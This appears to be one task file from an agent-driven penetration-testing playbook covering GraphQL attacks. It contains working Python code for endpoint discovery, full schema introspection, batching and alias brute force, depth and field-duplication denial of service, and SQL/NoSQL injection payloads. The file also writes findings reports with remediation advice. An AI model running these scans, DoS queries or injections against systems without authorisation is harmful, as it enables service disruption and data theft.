@@ -1,0 +1,833 @@
+================================================================================
+TASK 102 - GRAPHQL-SPECIFIC ATTACKS
+================================================================================
+Covers testing_toolkit.txt Phase 15 Step 57
+GraphQL introspection, injection, and DoS
+
+GRAPHQL = POWERFUL BUT DANGEROUS
+Single endpoint, flexible queries, built-in documentation.
+What could go wrong? A LOT.
+
+================================================================================
+INPUTS
+================================================================================
+outputs/live_base_urls.txt                 <- Live hosts
+outputs/url_corpus_all_in_scope.txt        <- URL corpus
+outputs/har/accounts/*_auth.json           <- Auth tokens
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/graphql/
+    endpoints.txt                          <- GraphQL endpoints found
+    introspection_results.json             <- Schema from introspection
+    mutations.txt                          <- Available mutations
+    queries.txt                            <- Available queries
+    injection_tests.txt                    <- Injection attempt results
+    dos_vectors.txt                        <- DoS-vulnerable queries
+
+outputs/vulnerabilities/GRAPHQL-*-HIGH.md
+
+================================================================================
+🧠 AGENT DECISION FRAMEWORK
+================================================================================
+
+UNDERSTAND GRAPHQL ATTACKS:
+
+    GraphQL attack surface:
+    |
+    +-- Introspection Enabled
+    |   +-- __schema query reveals everything
+    |   +-- All types, queries, mutations exposed
+    |   +-- Full API documentation for attacker
+    |
+    +-- Batching Attacks
+    |   +-- Multiple queries in one request
+    |   +-- Bypass rate limits per request
+    |   +-- Brute force via batching
+    |
+    +-- Depth/Complexity DoS
+    |   +-- Deeply nested queries
+    |   +-- Circular relationships
+    |   +-- Server resource exhaustion
+    |
+    +-- Authorization Bypass
+    |   +-- Access unauthorized fields
+    |   +-- Query data of other users
+    |   +-- Mutation authorization issues
+    |
+    +-- Injection
+        +-- SQL injection via arguments
+        +-- NoSQL injection
+        +-- SSRF via URL arguments
+
+================================================================================
+PHASE 1: GRAPHQL ENDPOINT DETECTION
+================================================================================
+
+-----------------------------------------
+1.1 Find GraphQL Endpoints
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+graphql_scanner.py - GraphQL endpoint detection and testing
+"""
+
+import requests
+import json
+import os
+from urllib.parse import urljoin
+
+os.makedirs('outputs/graphql', exist_ok=True)
+os.makedirs('outputs/vulnerabilities', exist_ok=True)
+
+requests.packages.urllib3.disable_warnings()
+
+# Common GraphQL endpoint paths
+GRAPHQL_PATHS = [
+    '/graphql',
+    '/graphql/',
+    '/api/graphql',
+    '/api/graphql/',
+    '/graphql/v1',
+    '/v1/graphql',
+    '/gql',
+    '/query',
+    '/api',
+    '/graphiql',
+    '/playground',
+    '/console',
+    '/explorer',
+]
+
+class GraphQLScanner:
+    
+    def __init__(self):
+        self.session = requests.Session()
+        self.endpoints = []
+    
+    def find_endpoints(self, base_url):
+        """Find GraphQL endpoints"""
+        
+        for path in GRAPHQL_PATHS:
+            url = urljoin(base_url, path)
+            
+            # Test with simple query
+            query = '{"query": "{ __typename }"}'
+            
+            try:
+                resp = self.session.post(
+                    url,
+                    data=query,
+                    headers={'Content-Type': 'application/json'},
+                    timeout=15,
+                    verify=False
+                )
+                
+                # Check for GraphQL response
+                if self.is_graphql_response(resp):
+                    self.endpoints.append({
+                        'url': url,
+                        'method': 'POST',
+                        'status': resp.status_code
+                    })
+                    continue
+                    
+            except:
+                pass
+            
+            # Also try GET
+            try:
+                resp = self.session.get(
+                    f"{url}?query={{__typename}}",
+                    timeout=15,
+                    verify=False
+                )
+                
+                if self.is_graphql_response(resp):
+                    self.endpoints.append({
+                        'url': url,
+                        'method': 'GET',
+                        'status': resp.status_code
+                    })
+                    
+            except:
+                pass
+        
+        return self.endpoints
+    
+    def is_graphql_response(self, response):
+        """Check if response is from GraphQL"""
+        
+        try:
+            data = response.json()
+            
+            # GraphQL responses have 'data' or 'errors' key
+            if 'data' in data or 'errors' in data:
+                return True
+            
+            # Check for GraphQL error format
+            if isinstance(data.get('errors'), list):
+                return True
+                
+        except:
+            pass
+        
+        # Check content type
+        content_type = response.headers.get('Content-Type', '')
+        if 'application/json' in content_type:
+            if 'graphql' in response.text.lower():
+                return True
+        
+        return False
+
+================================================================================
+PHASE 2: INTROSPECTION TESTING
+================================================================================
+
+-----------------------------------------
+2.1 Full Introspection Query
+-----------------------------------------
+INTROSPECTION_QUERY = '''
+{
+  __schema {
+    queryType { name }
+    mutationType { name }
+    subscriptionType { name }
+    types {
+      ...FullType
+    }
+    directives {
+      name
+      description
+      locations
+      args {
+        ...InputValue
+      }
+    }
+  }
+}
+
+fragment FullType on __Type {
+  kind
+  name
+  description
+  fields(includeDeprecated: true) {
+    name
+    description
+    args {
+      ...InputValue
+    }
+    type {
+      ...TypeRef
+    }
+    isDeprecated
+    deprecationReason
+  }
+  inputFields {
+    ...InputValue
+  }
+  interfaces {
+    ...TypeRef
+  }
+  enumValues(includeDeprecated: true) {
+    name
+    description
+    isDeprecated
+    deprecationReason
+  }
+  possibleTypes {
+    ...TypeRef
+  }
+}
+
+fragment InputValue on __InputValue {
+  name
+  description
+  type {
+    ...TypeRef
+  }
+  defaultValue
+}
+
+fragment TypeRef on __Type {
+  kind
+  name
+  ofType {
+    kind
+    name
+    ofType {
+      kind
+      name
+      ofType {
+        kind
+        name
+        ofType {
+          kind
+          name
+          ofType {
+            kind
+            name
+            ofType {
+              kind
+              name
+              ofType {
+                kind
+                name
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+'''
+
+def test_introspection(url, auth_token=None):
+    """Test if introspection is enabled"""
+    
+    session = requests.Session()
+    
+    headers = {'Content-Type': 'application/json'}
+    if auth_token:
+        headers['Authorization'] = f'Bearer {auth_token}'
+    
+    try:
+        resp = session.post(
+            url,
+            json={'query': INTROSPECTION_QUERY},
+            headers=headers,
+            timeout=30,
+            verify=False
+        )
+        
+        data = resp.json()
+        
+        if 'data' in data and data['data'].get('__schema'):
+            return {
+                'enabled': True,
+                'schema': data['data']['__schema']
+            }
+        
+        if 'errors' in data:
+            # Check if introspection is disabled
+            error_msg = str(data['errors'])
+            if 'introspection' in error_msg.lower():
+                return {
+                    'enabled': False,
+                    'message': 'Introspection disabled'
+                }
+                
+    except:
+        pass
+    
+    return {'enabled': False}
+
+-----------------------------------------
+2.2 Extract Sensitive Types
+-----------------------------------------
+def extract_sensitive_info(schema):
+    """Extract potentially sensitive types and fields from schema"""
+    
+    sensitive_patterns = [
+        'password', 'secret', 'token', 'key', 'auth',
+        'admin', 'private', 'internal', 'credit', 'ssn',
+        'email', 'phone', 'address', 'payment'
+    ]
+    
+    findings = {
+        'sensitive_types': [],
+        'sensitive_fields': [],
+        'mutations': [],
+        'queries': []
+    }
+    
+    for type_obj in schema.get('types', []):
+        type_name = type_obj.get('name', '')
+        
+        # Skip built-in types
+        if type_name.startswith('__'):
+            continue
+        
+        # Check type name
+        for pattern in sensitive_patterns:
+            if pattern in type_name.lower():
+                findings['sensitive_types'].append(type_name)
+                break
+        
+        # Check fields
+        for field in type_obj.get('fields', []) or []:
+            field_name = field.get('name', '')
+            
+            for pattern in sensitive_patterns:
+                if pattern in field_name.lower():
+                    findings['sensitive_fields'].append({
+                        'type': type_name,
+                        'field': field_name
+                    })
+                    break
+    
+    # Extract mutations and queries
+    if schema.get('mutationType'):
+        for type_obj in schema.get('types', []):
+            if type_obj.get('name') == schema['mutationType'].get('name'):
+                for field in type_obj.get('fields', []) or []:
+                    findings['mutations'].append(field.get('name'))
+    
+    if schema.get('queryType'):
+        for type_obj in schema.get('types', []):
+            if type_obj.get('name') == schema['queryType'].get('name'):
+                for field in type_obj.get('fields', []) or []:
+                    findings['queries'].append(field.get('name'))
+    
+    return findings
+
+================================================================================
+PHASE 3: BATCHING ATTACKS
+================================================================================
+
+-----------------------------------------
+3.1 Query Batching
+-----------------------------------------
+def test_batching(url, query, count=100, auth_token=None):
+    """Test query batching for rate limit bypass"""
+    
+    session = requests.Session()
+    
+    headers = {'Content-Type': 'application/json'}
+    if auth_token:
+        headers['Authorization'] = f'Bearer {auth_token}'
+    
+    # Create batch of queries
+    batch = [{'query': query} for _ in range(count)]
+    
+    try:
+        resp = session.post(
+            url,
+            json=batch,
+            headers=headers,
+            timeout=60,
+            verify=False
+        )
+        
+        data = resp.json()
+        
+        # If array of results, batching works
+        if isinstance(data, list):
+            return {
+                'batching_enabled': True,
+                'queries_sent': count,
+                'responses': len(data)
+            }
+            
+    except:
+        pass
+    
+    return {'batching_enabled': False}
+
+-----------------------------------------
+3.2 Alias Batching for Brute Force
+-----------------------------------------
+def generate_alias_batch(field, values, value_param='id'):
+    """Generate aliased queries for brute force"""
+    
+    """
+    Example: Brute force user IDs
+    
+    query {
+      user1: user(id: 1) { name }
+      user2: user(id: 2) { name }
+      user3: user(id: 3) { name }
+      ...
+    }
+    """
+    
+    aliases = []
+    for i, value in enumerate(values):
+        alias = f"q{i}: {field}({value_param}: {json.dumps(value)}) {{ id }}"
+        aliases.append(alias)
+    
+    query = "query { " + " ".join(aliases) + " }"
+    
+    return query
+
+================================================================================
+PHASE 4: DOS ATTACKS
+================================================================================
+
+-----------------------------------------
+4.1 Depth-Based DoS
+-----------------------------------------
+def test_depth_dos(url, auth_token=None, max_depth=20):
+    """Test for depth-based DoS vulnerability"""
+    
+    # Generate deeply nested query
+    # Assumes a type that has a self-referencing field (like User -> friends -> friends)
+    
+    def generate_nested_query(depth, field='user', nested_field='friends'):
+        if depth == 0:
+            return 'id'
+        return f'{nested_field} {{ {generate_nested_query(depth-1, field, nested_field)} }}'
+    
+    query = f'query {{ user {{ {generate_nested_query(max_depth)} }} }}'
+    
+    session = requests.Session()
+    
+    headers = {'Content-Type': 'application/json'}
+    if auth_token:
+        headers['Authorization'] = f'Bearer {auth_token}'
+    
+    try:
+        import time
+        start = time.time()
+        
+        resp = session.post(
+            url,
+            json={'query': query},
+            headers=headers,
+            timeout=60,
+            verify=False
+        )
+        
+        elapsed = time.time() - start
+        
+        return {
+            'depth_tested': max_depth,
+            'response_time': elapsed,
+            'status': resp.status_code,
+            'potential_dos': elapsed > 10
+        }
+        
+    except:
+        return {'error': True}
+
+-----------------------------------------
+4.2 Field Duplication DoS
+-----------------------------------------
+def test_field_duplication(url, auth_token=None, duplicates=1000):
+    """Test for field duplication DoS"""
+    
+    # Duplicate fields cause multiple resolutions
+    fields = ' '.join(['id'] * duplicates)
+    query = f'query {{ user {{ {fields} }} }}'
+    
+    session = requests.Session()
+    
+    headers = {'Content-Type': 'application/json'}
+    if auth_token:
+        headers['Authorization'] = f'Bearer {auth_token}'
+    
+    try:
+        import time
+        start = time.time()
+        
+        resp = session.post(
+            url,
+            json={'query': query},
+            headers=headers,
+            timeout=60,
+            verify=False
+        )
+        
+        elapsed = time.time() - start
+        
+        return {
+            'duplicates': duplicates,
+            'response_time': elapsed,
+            'potential_dos': elapsed > 5
+        }
+        
+    except:
+        return {'error': True}
+
+================================================================================
+PHASE 5: INJECTION TESTING
+================================================================================
+
+-----------------------------------------
+5.1 GraphQL Injection Payloads
+-----------------------------------------
+GRAPHQL_INJECTION_PAYLOADS = [
+    # SQL injection via arguments
+    '") OR 1=1--',
+    "') OR '1'='1",
+    '" UNION SELECT * FROM users--',
+    
+    # NoSQL injection
+    '{"$gt": ""}',
+    '{"$ne": null}',
+    '{"$regex": ".*"}',
+    
+    # Field injection
+    'id\n  password',
+    'id} password{',
+    
+    # Directive injection
+    '@skip(if: true)',
+    '@include(if: false)',
+]
+
+def test_graphql_injection(url, query_template, param, auth_token=None):
+    """Test for injection in GraphQL arguments"""
+    
+    session = requests.Session()
+    
+    headers = {'Content-Type': 'application/json'}
+    if auth_token:
+        headers['Authorization'] = f'Bearer {auth_token}'
+    
+    findings = []
+    
+    for payload in GRAPHQL_INJECTION_PAYLOADS:
+        query = query_template.replace('{PAYLOAD}', payload)
+        
+        try:
+            resp = session.post(
+                url,
+                json={'query': query},
+                headers=headers,
+                timeout=15,
+                verify=False
+            )
+            
+            data = resp.json()
+            
+            # Check for error messages revealing injection
+            if 'errors' in data:
+                error_msg = str(data['errors'])
+                
+                injection_indicators = [
+                    'sql', 'syntax', 'mongodb', 'unexpected',
+                    'parse', 'invalid', 'operator'
+                ]
+                
+                for indicator in injection_indicators:
+                    if indicator in error_msg.lower():
+                        findings.append({
+                            'payload': payload,
+                            'error': error_msg[:200]
+                        })
+                        break
+                        
+        except:
+            continue
+    
+    return findings
+
+================================================================================
+PHASE 6: FULL AUTOMATION
+================================================================================
+
+#!/usr/bin/env python3
+"""
+graphql_complete.py - Complete GraphQL security testing
+"""
+
+import os
+import json
+import requests
+from urllib.parse import urljoin
+
+os.makedirs('outputs/graphql', exist_ok=True)
+os.makedirs('outputs/vulnerabilities', exist_ok=True)
+
+requests.packages.urllib3.disable_warnings()
+
+class GraphQLAudit:
+    
+    def __init__(self):
+        self.session = requests.Session()
+        self.endpoints = []
+        self.findings = []
+    
+    def find_endpoints(self, base_urls):
+        """Find GraphQL endpoints"""
+        
+        paths = ['/graphql', '/api/graphql', '/gql', '/query']
+        
+        for base in base_urls:
+            for path in paths:
+                url = urljoin(base, path)
+                
+                try:
+                    resp = self.session.post(
+                        url,
+                        json={'query': '{__typename}'},
+                        headers={'Content-Type': 'application/json'},
+                        timeout=15,
+                        verify=False
+                    )
+                    
+                    if 'data' in resp.text or 'errors' in resp.text:
+                        self.endpoints.append(url)
+                        
+                except:
+                    continue
+        
+        return self.endpoints
+    
+    def test_introspection(self, url, auth_token=None):
+        """Test introspection"""
+        
+        headers = {'Content-Type': 'application/json'}
+        if auth_token:
+            headers['Authorization'] = f'Bearer {auth_token}'
+        
+        query = '{ __schema { types { name } } }'
+        
+        try:
+            resp = self.session.post(
+                url,
+                json={'query': query},
+                headers=headers,
+                timeout=30,
+                verify=False
+            )
+            
+            data = resp.json()
+            
+            if data.get('data', {}).get('__schema'):
+                self.findings.append({
+                    'url': url,
+                    'type': 'introspection_enabled',
+                    'severity': 'MEDIUM',
+                    'schema': data['data']['__schema']
+                })
+                return True
+                
+        except:
+            pass
+        
+        return False
+    
+    def test_batching(self, url, auth_token=None):
+        """Test query batching"""
+        
+        headers = {'Content-Type': 'application/json'}
+        if auth_token:
+            headers['Authorization'] = f'Bearer {auth_token}'
+        
+        batch = [{'query': '{__typename}'} for _ in range(10)]
+        
+        try:
+            resp = self.session.post(
+                url,
+                json=batch,
+                headers=headers,
+                timeout=30,
+                verify=False
+            )
+            
+            data = resp.json()
+            
+            if isinstance(data, list):
+                self.findings.append({
+                    'url': url,
+                    'type': 'batching_enabled',
+                    'severity': 'LOW',
+                    'note': 'Can be used for rate limit bypass'
+                })
+                
+        except:
+            pass
+    
+    def scan_all(self, urls, auth_token=None):
+        """Scan all URLs"""
+        
+        # Find endpoints first
+        from urllib.parse import urlparse
+        base_urls = list(set([
+            f"{urlparse(url).scheme}://{urlparse(url).netloc}"
+            for url in urls
+        ]))
+        
+        print(f"[*] Scanning {len(base_urls)} base URLs for GraphQL...")
+        self.find_endpoints(base_urls)
+        
+        print(f"[*] Found {len(self.endpoints)} GraphQL endpoints")
+        
+        # Test each endpoint
+        for endpoint in self.endpoints:
+            self.test_introspection(endpoint, auth_token)
+            self.test_batching(endpoint, auth_token)
+    
+    def generate_reports(self):
+        """Generate vulnerability reports"""
+        
+        for i, finding in enumerate(self.findings):
+            report = f"""# GraphQL Vulnerability
+
+**URL**: {finding['url']}
+**Type**: {finding['type']}
+**Severity**: {finding.get('severity', 'MEDIUM')}
+
+## Description
+{'GraphQL introspection is enabled, exposing the full API schema.' if 'introspection' in finding['type']
+ else 'Query batching is enabled, allowing rate limit bypass.' if 'batching' in finding['type']
+ else 'GraphQL vulnerability detected.'}
+
+## Impact
+{'Full API documentation available to attackers.' if 'introspection' in finding['type']
+ else 'Rate limiting can be bypassed via batched queries.'}
+
+## PoC
+```graphql
+{'{ __schema { types { name } } }' if 'introspection' in finding['type']
+ else '[{"query": "{__typename}"}, {"query": "{__typename}"}]'}
+```
+
+## Recommendations
+1. Disable introspection in production
+2. Implement query depth limiting
+3. Implement query complexity analysis
+4. Rate limit by query cost, not requests
+"""
+            
+            with open(f'outputs/vulnerabilities/GRAPHQL-{i}-{finding.get("severity", "MEDIUM")}.md', 'w') as f:
+                f.write(report)
+    
+    def save_results(self):
+        """Save all results"""
+        
+        with open('outputs/graphql/endpoints.txt', 'w') as f:
+            for ep in self.endpoints:
+                f.write(f"{ep}\n")
+        
+        intro = [f for f in self.findings if 'introspection' in f['type']]
+        if intro and intro[0].get('schema'):
+            with open('outputs/graphql/introspection_results.json', 'w') as f:
+                json.dump(intro[0]['schema'], f, indent=2)
+        
+        with open('outputs/graphql/findings.json', 'w') as f:
+            json.dump(self.findings, f, indent=2)
+
+# Run
+if __name__ == "__main__":
+    with open('outputs/url_corpus_all_in_scope.txt') as f:
+        urls = [l.strip() for l in f if l.strip()]
+    
+    audit = GraphQLAudit()
+    audit.scan_all(urls)
+    audit.save_results()
+    audit.generate_reports()
+    
+    print(f"\n[*] GraphQL findings: {len(audit.findings)}")
+
+================================================================================
+SUMMARY CHECKLIST
+================================================================================
+
+[ ] GraphQL endpoints discovered
+[ ] Introspection tested
+[ ] Schema extracted (if enabled)
+[ ] Batching tested
+[ ] Depth-based DoS tested
+[ ] Field duplication DoS tested
+[ ] Injection via arguments tested
+[ ] All findings documented
+
+================================================================================
+NEXT TASK
+================================================================================
+Task 103: WebSocket Vulnerabilities (Phase 15 - Misc Advanced)
